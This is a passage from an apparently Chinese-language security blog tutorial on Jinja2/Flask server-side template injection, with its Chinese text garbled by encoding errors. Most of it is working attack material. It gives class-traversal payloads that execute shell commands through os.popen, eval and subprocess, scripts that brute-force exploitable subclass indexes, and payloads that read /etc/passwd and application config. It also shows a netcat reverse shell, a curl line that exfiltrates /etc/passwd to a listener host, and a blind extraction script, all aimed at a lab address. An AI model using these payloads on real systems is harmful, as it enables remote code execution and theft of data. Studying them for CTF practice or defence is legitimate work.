class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(c.__class__)<span class="comment"># &lt;class &#x27;__main__.C&#x27;&gt;å½“å‰ç±»C</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__)<span class="comment"># &lt;class &#x27;__main__.B&#x27;&gt;å½“å‰ç±»Cçš„çˆ¶ç±»B</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__.__base__)<span class="comment"># &lt;class &#x27;__main__.A&#x27;&gt;çˆ¶ç±»çš„çˆ¶ç±»</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__.__base__.__base__)<span class="comment"># &lt;class &#x27;object&#x27;&gt;å±‚å±‚é€’è¿›</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__mro__)<span class="comment"># (&lt;class &#x27;__main__.C&#x27;&gt;, &lt;class &#x27;__main__.B&#x27;&gt;, &lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)ç½—åˆ—æ‰€æœ‰çˆ¶ç±»å…³ç³»C-&gt;B-&gt;A-&gt;Object</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__.__subclasses__())<span class="comment"># [&lt;class &#x27;__main__.C&#x27;&gt;, &lt;class &#x27;__main__.D&#x27;&gt;]Bä¸‹çš„æ‰€æœ‰å­ç±»ï¼ˆæ•°ç»„å½¢å¼ï¼‰</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__.__subclasses__()[<span class="number">1</span>])<span class="comment"># &lt;class &#x27;__main__.D&#x27;&gt;è°ƒç”¨å­ç±»D</span></span><br></pre></td></tr></table></figure><h2 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h2><blockquote><p><code>__class__</code> æŸ¥æ‰¾å½“å‰ç±»å‹çš„æ‰€å±å¯¹è±¡</p><p><code>__base__</code> æ²¿ç€çˆ¶å­ç±»çš„å…³ç³»å¾€ä¸Šèµ°ä¸€ä¸ª</p><p><code>__mro__</code> æŸ¥æ‰¾å½“å‰ç±»å¯¹è±¡çš„æ‰€æœ‰ç»§æ‰¿ç±»</p><p><code>__subclasses__</code> æŸ¥æ‰¾çˆ¶ç±»ä¸‹çš„æ‰€æœ‰å­ç±»</p><p><code>__init__</code> æŸ¥çœ‹ç±»æ˜¯å¦é‡è½½ï¼Œé‡è½½æ˜¯æŒ‡ç¨‹åºåœ¨è¿è¡Œæ—¶å°±å·²ç»åŠ è½½å¥½äº†è¿™ä¸ªæ¨¡å—åˆ°å†…å­˜ä¸­ï¼Œå¦‚æœå‡ºç°<strong>wrapper</strong>å­—çœ¼ï¼Œè¯´æ˜æ²¡æœ‰é‡è½½</p><p><code>__globals__</code> å‡½æ•°ä¼šä»¥å­—å…¸çš„å½¢å¼è¿”å›å½“å‰å¯¹è±¡çš„å…¨éƒ¨å…¨å±€å˜é‡</p></blockquote><p><strong>å¸¸ç”¨æ³¨å…¥æ¨¡å—ï¼š</strong></p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti_02.png" alt=""></p><h1 id="æ£€æŸ¥æ¼æ´"><a href="#æ£€æŸ¥æ¼æ´" class="headerlink" title="æ£€æŸ¥æ¼æ´"></a>æ£€æŸ¥æ¼æ´</h1><h2 id="ä¸¾ä¾‹"><a href="#ä¸¾ä¾‹" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h2><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja2_01.png" alt=""></p><p>åˆ©ç”¨<code>&#123;&#123;7*7&#125;&#125;</code>æ£€æŸ¥æ˜¯å¦å­˜åœ¨æ¼æ´</p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja_02.png" alt=""></p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja_03.png" alt=""></p><p>ç”¨<code>&#123;&#123;''.__class__&#125;&#125;</code>è¯•éªŒä¸€ä¸‹ï¼š</p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja_04.png" alt=""></p><p>åˆ©ç”¨<code>&#123;&#123;''.__class__.__base__&#125;&#125;</code>æ‰¾åˆ°çˆ¶ç±»ï¼š</p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja_05.png" alt=""></p><p>åˆ©ç”¨<code>&#123;&#123;''.__class__.__base__.__subclasses__()&#125;&#125;</code>å°†æ‰€æœ‰çš„å­ç±»æ‰¾åˆ°ï¼š</p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja_06.png" alt=""></p><p>æ ¹æ®ä¸Šé¢å¸¸ç”¨çš„æ³¨å…¥æ¨¡å—æ‰¾åˆ°ç›®æ ‡æ¨¡å—ï¼š<code>&#123;&#123;''.__class__.__base__.__subclasses__()[117]&#125;&#125;</code></p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja_07.png" alt=""></p><p>åˆ©ç”¨<code>&#123;&#123;''.__class__.__base__.__subclasses__()[117].__init__&#125;&#125;</code>æ£€æŸ¥æ˜¯å¦é‡è½½ï¼š</p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja_08.png" alt=""></p><p>æ²¡æœ‰<code>wrapper</code>ï¼Œè¯´æ˜å°±å·²ç»é‡è½½ï¼Œé€šè¿‡<code>&#123;&#123;''.__class__.__base__.__subclasses__()[117].__init__.__globals__&#125;&#125;</code>æŸ¥çœ‹å…¨éƒ¨å…¨å±€å˜é‡ï¼Œæœ‰å“ªäº›å¯ä»¥ä½¿ç”¨çš„æ–¹æ³•å‡½æ•°ç­‰</p><p>åˆ©ç”¨<code>&#123;&#123;''.__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")&#125;&#125;</code>æŸ¥çœ‹å…·ä½“æ•°æ®ï¼š</p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja_09.png" alt=""></p><p>å…¶ä¸­ï¼š</p><ul><li><code>__builtins__</code> æä¾›å¯¹Pythonçš„æ‰€æœ‰â€œå†…ç½®â€æ ‡è¯†ç¬¦çš„ç›´æ¥è®¿é—®</li><li><code>eval()</code> è®¡ç®—å­—ç¬¦ä¸²è¡¨è¾¾å¼çš„å€¼</li><li><code>popen()</code> æ‰§è¡Œä¸€ä¸ªshellä»¥è¿è¡Œå‘½ä»¤æ¥å¼€å¯ä¸€ä¸ªè¿›ç¨‹</li></ul><p>ä¸Šè¿°<code>payload</code>å¯æ›¿æ¢æˆ<code>&#123;&#123;''.__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('ls').read()&#125;&#125;</code></p><h1 id="å¸¸ç”¨æ³¨å…¥æ¨¡å—"><a href="#å¸¸ç”¨æ³¨å…¥æ¨¡å—" class="headerlink" title="å¸¸ç”¨æ³¨å…¥æ¨¡å—"></a>å¸¸ç”¨æ³¨å…¥æ¨¡å—</h1><h2 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h2><ul><li><code>__frozen__importlib__external.FileLoadser</code> æŸ¥æ‰¾å­ç±»</li></ul><p>Pythonè„šæœ¬ï¼ŒPOSTæäº¤â€œnameâ€çš„å€¼ï¼Œé€šè¿‡forå¾ªç¯æŸ¥æ‰¾æ‰€éœ€å­—ç¬¦ä¸²</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&#x27;è¯·è¾“å…¥URLé“¾æ¥ï¼š&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;__frozen__importlib_external.FileLoader&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span>  </span><br></pre></td></tr></table></figure><p>â€œnameâ€å…·ä½“å†™ä»€ä¹ˆçœ‹ç½‘é¡µæºç ï¼š</p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja_10.png" alt=""></p><p><strong>FileLoaderçš„åˆ©ç”¨</strong></p><p><code>[&quot;get_data&quot;](0,&quot;/etc/passwd&quot;)</code> è°ƒç”¨get_dataæ–¹æ³•ï¼Œä¼ å…¥å‚æ•°0å’Œæ–‡ä»¶è·¯å¾„</p><p><strong>è¯»å–é…ç½®æ–‡ä»¶ä¸‹çš„FLAG</strong></p><p><code>&#123;&#123;url_for.__globals__['current_app'].config.FLAG&#125;&#125;</code></p><p><code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config.FLAG&#125;&#125;</code></p><h2 id="å†…å»ºå‡½æ•°evalæ‰§è¡Œå‘½ä»¤"><a href="#å†…å»ºå‡½æ•°evalæ‰§è¡Œå‘½ä»¤" class="headerlink" title="å†…å»ºå‡½æ•°evalæ‰§è¡Œå‘½ä»¤"></a>å†…å»ºå‡½æ•°evalæ‰§è¡Œå‘½ä»¤</h2><p><strong>å†…å»ºå‡½æ•°ï¼špythonåœ¨æ‰§è¡Œè„šæœ¬æ—¶è‡ªåŠ¨åŠ è½½çš„å‡½æ•°</strong></p><p>pythonè„šæœ¬æŸ¥çœ‹å¯åˆ©ç”¨å†…å»ºå‡½æ•°evalæ¨¡å—ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&#x27;è¯·è¾“å…¥URLé“¾æ¥ï¼š&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&#123;&#123;().__class__.base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p> <strong>â€œnameâ€å…·ä½“å†™ä»€ä¹ˆçœ‹ç½‘é¡µæºç </strong></p><p><strong>Payloadï¼š</strong></p><p><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[65].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat /etc/passwd").read()')&#125;&#125;</code></p><h2 id="osæ¨¡å—æ‰§è¡Œå‘½ä»¤"><a href="#osæ¨¡å—æ‰§è¡Œå‘½ä»¤" class="headerlink" title="osæ¨¡å—æ‰§è¡Œå‘½ä»¤"></a>osæ¨¡å—æ‰§è¡Œå‘½ä»¤</h2><p>åœ¨å…¶ä»–å‡½æ•°ä¸­ç›´æ¥è°ƒç”¨osæ¨¡å—</p><ul><li><p>é€šè¿‡configï¼Œè°ƒç”¨os</p><p><code>&#123;&#123;config.__class__.init__.__globals__['os'].popen('whoami').read()&#125;&#125;</code></p></li><li><p>é€šè¿‡url_forï¼Œè°ƒç”¨os</p><p><code>&#123;&#123;url_for.__globals__.os.popen('whoami').read()&#125;&#125;</code></p></li><li><p>åœ¨å·²ç»åŠ è½½osæ¨¡å—çš„å­ç±»é‡Œç›´æ¥è°ƒç”¨osæ¨¡å—</p><p><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[199].__init__.__globals__['os'].popen("ls -l /opt").read()&#125;&#125;</code></p></li></ul><p>pythonè„šæœ¬æŸ¥æ‰¾å·²ç»åŠ è½½osæ¨¡å—çš„å­ç±»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&#x27;è¯·è¾“å…¥URLé“¾æ¥ï¼š&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;os.py&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="importlibç±»æ‰§è¡Œå‘½ä»¤"><a href="#importlibç±»æ‰§è¡Œå‘½ä»¤" class="headerlink" title="importlibç±»æ‰§è¡Œå‘½ä»¤"></a>importlibç±»æ‰§è¡Œå‘½ä»¤</h2><p>pythonè„šæœ¬æŸ¥æ‰¾<code>_frozen_importlib.BuiltinImporter</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&#x27;è¯·è¾“å…¥URLé“¾æ¥ï¼š&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥åŠ è½½ç¬¬ä¸‰æ–¹åº“ï¼Œä½¿ç”¨load_moduleåŠ è½½os</p><p><code>&#123;&#123;[].__class__.__base__.__subclasses__()[69]["load_module"]("os")["popen"]("ls -l /opt").read()&#125;&#125;</code></p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja2_11.png" alt=""></p><h2 id="linecacheå‡½æ•°æ‰§è¡Œå‘½ä»¤"><a href="#linecacheå‡½æ•°æ‰§è¡Œå‘½ä»¤" class="headerlink" title="linecacheå‡½æ•°æ‰§è¡Œå‘½ä»¤"></a>linecacheå‡½æ•°æ‰§è¡Œå‘½ä»¤</h2><p><strong>linecache</strong>å‡½æ•°å¯ç”¨äºè¯»å–ä»»æ„ä¸€ä¸ªæ–‡ä»¶çš„æŸä¸€è¡Œï¼Œè€Œè¿™ä¸ªå‡½æ•°ä¸­ä¹Ÿå¼•å…¥äº†osæ¨¡å—ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨è¿™ä¸ªlinecacheå‡½æ•°å»æ‰§è¡Œå‘½ä»¤</p><p>pythonè„šæœ¬æŸ¥æ‰¾linecache</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&#x27;è¯·è¾“å…¥URLé“¾æ¥ï¼š&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;linecache&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="subprocess-Popenç±»æ‰§è¡Œå‘½ä»¤"><a href="#subprocess-Popenç±»æ‰§è¡Œå‘½ä»¤" class="headerlink" title="subprocess.Popenç±»æ‰§è¡Œå‘½ä»¤"></a>subprocess.Popenç±»æ‰§è¡Œå‘½ä»¤</h2><p>ä»python2.4ç‰ˆæœ¬å¼€å§‹ï¼Œå¯ä»¥ç”¨subprocessè¿™ä¸ªæ¨¡å—æ¥äº§ç”Ÿå­è¿›ç¨‹ï¼Œå¹¶è¿æ¥åˆ°å­è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥/è¾“å‡º/é”™è¯¯ä¸­å»ï¼Œè¿˜å¯ä»¥å¾—åˆ°å­è¿›ç¨‹çš„è¿”å›å€¼</p><p>subprocesså¯ä»¥æ›¿ä»£å…¶ä»–å‡ ä¸ªè€çš„æ¨¡å—æˆ–è€…å‡½æ•°ï¼Œæ¯”å¦‚ï¼šos.systemã€os.popenç­‰</p><p>pythonè„šæœ¬æŸ¥æ‰¾subprocess.Popen</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&#x27;è¯·è¾“å…¥URLé“¾æ¥ï¼š&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;subprocess.Popen&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>ç”¨æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[200](&#x27;ls /&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja2_12.png" alt=""></p><h1 id="æ— å›æ˜¾SSTI"><a href="#æ— å›æ˜¾SSTI" class="headerlink" title="æ— å›æ˜¾SSTI"></a>æ— å›æ˜¾SSTI</h1><h2 id="SSTIç›²æ³¨æ€è·¯"><a href="#SSTIç›²æ³¨æ€è·¯" class="headerlink" title="SSTIç›²æ³¨æ€è·¯"></a>SSTIç›²æ³¨æ€è·¯</h2><p><strong>åå¼¹shell</strong></p><ul><li>é€šè¿‡rceåå¼¹ä¸€ä¸ªshellå‡ºæ¥ç»•è¿‡æ— å›æ˜¾çš„é¡µé¢</li></ul><p><strong>å¸¦å¤–æ³¨å…¥</strong></p><ul><li>é€šè¿‡requestbinæˆ–dnslogçš„æ–¹å¼å°†ä¿¡æ¯ä¼ åˆ°å¤–ç•Œ</li></ul><p><strong>çº¯ç›²æ³¨</strong></p><ul><li>éœ€è¦ä¸€å®šçš„å›æ˜¾</li></ul><h2 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h2><p>æ²¡æœ‰å›æ˜¾ï¼Œç›´æ¥ä½¿ç”¨è„šæœ¬æ‰¹é‡æ‰§è¡Œå¸Œæœ›æ‰§è¡Œçš„å‘½ä»¤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.17.129:18080/flasklab/level/3&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = &#123;<span class="string">&quot;code&quot;</span>:<span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;nc 192.168.17.129 7777 -e /bin/bash&quot;).read()&#125;&#125;&#x27;</span>&#125;</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾åŒ…å«popençš„å­ç±»æ¥æ‰§è¡Œå‘½ä»¤</p><p>åŒæ—¶kaliç›‘å¬ç«¯å£ï¼ˆnc -lvp 7777ï¼‰</p><h2 id="å¸¦å¤–æ³¨å…¥"><a href="#å¸¦å¤–æ³¨å…¥" class="headerlink" title="å¸¦å¤–æ³¨å…¥"></a>å¸¦å¤–æ³¨å…¥</h2><p>æ­¤å¤„ä¹Ÿå¯ä»¥ä½¿ç”¨wgetæ–¹æ³•æ¥å¸¦å¤–æƒ³è¦çŸ¥é“çš„å†…å®¹ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨dnslogæˆ–è€…nc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.17.129:18080/flasklab/level/3&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = &#123;<span class="string">&quot;code&quot;</span>:<span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;curl http://192.168.17.129/`cat /etc/passwd`&quot;).read()&#125;&#125;&#x27;</span>&#125;</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>åŒæ—¶kaliå¼€å¯ä¸€ä¸ªpython httpç›‘å¬ï¼ˆ<code>python3 -m http.server 80</code>ï¼‰</p><h2 id="çº¯ç›²æ³¨"><a href="#çº¯ç›²æ³¨" class="headerlink" title="çº¯ç›²æ³¨"></a>çº¯ç›²æ³¨</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://192.168.17.129:18080/flasklab/level/1&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">payload</span>):</span><br><span class="line">    postdata = &#123;</span><br><span class="line">        <span class="string">&#x27;code&#x27;</span>:payload</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url,data=postdata)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Spongebob&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">s = <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\&#x27;&quot;_%&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        payload = <span class="string">&#x27;&#123;% if &quot;&quot;.__class__.__bases__[0].__subclasses__()[199].__init__.__globals__[&quot;os&quot;].popen(&quot;cat /etc/passwd&quot;).read()[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;:&#x27;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&#x27;] == &quot;&#x27;</span>+c+<span class="string">&#x27;&quot;%&#125;Spongebob&#123;% endif %&#125;&#x27;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            password +=c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure><h1 id="å¸¸è§ç»•è¿‡æ–¹å¼"><a href="#å¸¸è§ç»•è¿‡æ–¹å¼" 